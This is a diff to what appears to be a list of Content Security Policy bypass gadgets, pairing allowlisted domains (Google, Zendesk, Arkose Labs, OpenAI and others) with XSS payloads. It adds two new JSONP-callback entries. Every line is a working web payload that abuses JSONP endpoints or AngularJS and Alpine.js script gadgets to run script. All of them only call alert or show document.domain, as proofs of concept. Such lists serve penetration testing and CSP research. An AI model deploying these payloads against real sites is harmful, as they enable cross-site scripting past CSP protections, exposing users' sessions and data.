@@ -34,6 +34,7 @@ cdn.shopify.com	<script src="https://cdn.shopify.com/s/files/1/0714/7936/1848/fi
 cdn.syncfusion.com	<body ng-app ng-csp><script src="https://cdn.syncfusion.com/js/assets/external/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 cdnjs.cloudflare.com	<script src="https://cdnjs.cloudflare.com/ajax/libs/alpinejs/3.10.5/cdn.min.js"></script><div x-init="alert(1)">
 cdnjs.cloudflare.com	<body ng-app ng-csp><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
+client-api.arkoselabs.com	<script src="https://client-api.arkoselabs.com/fc/a/?callback=alert"></script>
 code.angularjs.org	<body ng-app ng-csp><script src="https://code.angularjs.org/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 connect.mail.ru	<script src="https://connect.mail.ru/share_count?url_list=x&callback=1&func=alert"></script>
 d.adroll.com	<script src="https://d.adroll.com/user_attrs?advertisable_eid=5L5IV3X4ZNCUZFMLN5KKOD&jsonp=alert(document.domain)"></script>
@@ -87,6 +88,7 @@ support.zendesk.com	<script src=https://support.zendesk.com/accounts/reminder?ca
 sync.im-apps.net	<script src="https://sync.im-apps.net/imid/segment?callback=alert(1)&token=VXoW9wEaCAYxiIkb8Mzm7Q"></script>
 tagmanager.google.com	<script src="https://tagmanager.google.com/debug/api/vtinfo?gtm_auth=a-0uanYFkML7e3v7Vmxpwg&env_id=env-8&public_id=GTM-TWMCBFD&templates=&callback=alert"></script>
 tcr9i.openai.com	<script src="https://tcr9i.openai.com/fc/a/?callback=alert"></script>
+thiscanbeanything.zendesk.com	<script src="https://thiscanbeanything.zendesk.com/sc/faye/?message=[{%22channel%22:%22%22}]&jsonp=alert"></script>
 translate.google.com	<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>
 translate.googleapis.com	<script src="https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();"></script>
 translate.yandex.net	<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>
